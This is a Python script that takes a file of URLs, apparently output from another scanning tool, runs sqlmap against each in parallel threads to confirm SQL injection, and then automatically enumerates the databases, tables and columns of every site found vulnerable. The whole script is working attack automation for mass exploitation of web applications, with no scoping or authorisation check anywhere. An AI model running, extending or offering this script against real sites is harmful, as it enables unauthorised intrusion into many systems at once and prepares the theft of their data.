import subprocess
import os
import time
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Initializes a lock for thread-safe printing
print_lock = Lock()

# Function which brings in the results data from another script
def import_results_data(path):
    # Opens the file with read
    with open(path, "r") as f:
        # Brings in the data as a list and strips whitespace
        data = [line.strip() for line in f.readlines() if line.strip()]
    # Returns the data
    return data

# Function to verify a single URL (Optimized for speed)
def verify_single_url(url, verified_urls):
    # Runs sqlmap with --smart and --batch to skip slow tests
    result = subprocess.run(
        ["sqlmap", "-u", url, "--batch", "--smart", "--level=1"], 
        capture_output=True, 
        text=True
    )

    with print_lock:
        # Checks the standard output for vulnerability confirmation
        if "is vulnerable" in result.stdout:
            print(f"[+] Confirmed: {url}")
            verified_urls.append(url)
        else:
            print(f"[-] Skipped: {url}")

# Function to extract the databases
def extract_databases(url):
    # Stores the databases
    databases = []
    # Runs sqlmap as a subprocess to get databases with internal threading
    database_scan = subprocess.run(["sqlmap", "-u", url, "--dbs", "--batch", "--threads=10"], capture_output=True, text=True)

    for line in database_scan.stdout.splitlines():
        if "[*]" in line and "starting at" not in line:
            database = line.split()[-1]
            databases.append(database)
    return list(set(databases))

# Function to extract the tables
def extract_tables(url, databases):
    # Stores the database tables mapping
    database_tables = {}
    for database in databases:
        database_tables[database] = []
        # Runs sqlmap to get tables for the specific database
        result = subprocess.run(["sqlmap", "-u", url, "-D", database, "--tables", "--batch", "--threads=10"], capture_output=True, text=True)

        for line in result.stdout.splitlines():
            if "|" in line and not any(x in line for x in ["Table", "+---", "---"]):
                parts = [p.strip() for p in line.split("|") if p.strip()]
                if parts:
                    database_tables[database].append(parts[0])
    return database_tables

# Function to extract the columns
def extract_columns(url, db_tables_map):
    # Stores the columns data in a nested dictionary
    column_data = {}
    for database, tables in db_tables_map.items():
        column_data[database] = {}
        for table in tables:
            column_data[database][table] = []
            # Runs sqlmap to get columns for the specific table
            result = subprocess.run(["sqlmap", "-u", url, "-D", database, "-T", table, "--columns", "--batch", "--threads=10"], capture_output=True, text=True)

            for line in result.stdout.splitlines():
                if "|" in line and not any(x in line for x in ["Column", "+---", "Type"]):
                    parts = [p.strip() for p in line.split("|") if p.strip()]
                    if parts:
                        column_data[database][table].append(parts[0])
    return column_data

# Function to process a single verified URL entirely
def process_target(url):
    with print_lock:
        print(f"\n--- Starting Full Enumeration: {url} ---")

    # Step 1: Get Databases
    dbs = extract_databases(url)
    
    # Step 2: Get Tables
    db_map = extract_tables(url, dbs)
    
    # Step 3: Get Columns
    full_data = extract_columns(url, db_map)

    with print_lock:
        print(f"[!] Finished {url}. Found {len(dbs)} databases.")
        # You can add logic here to save full_data to a JSON or Text file

# Main executable function
def main():
    start_time = time.perf_counter() 
    results_path = input("[+] Please enter the results file path: ").strip()

    if os.path.isfile(results_path):
        raw_data = import_results_data(results_path)
        verified_urls = []

        print(f"[+] Filtering {len(raw_data)} targets...")
        with ThreadPoolExecutor(max_workers=10) as filter_exec:
            for url in raw_data:
                filter_exec.submit(verify_single_url, url, verified_urls)

        print(f"[+] Processing {len(verified_urls)} confirmed targets...")
        # Processing targets in parallel (limit to 3-5 to prevent network congestion)
        with ThreadPoolExecutor(max_workers=3) as process_exec:
            for url in verified_urls:
                process_exec.submit(process_target, url)
    else:
        print("[!] Invalid file path")

    elapsed = time.perf_counter() - start_time
    print(f"\n[âœ“] Finished in {elapsed:.2f} seconds")

if __name__ == "__main__":
    main()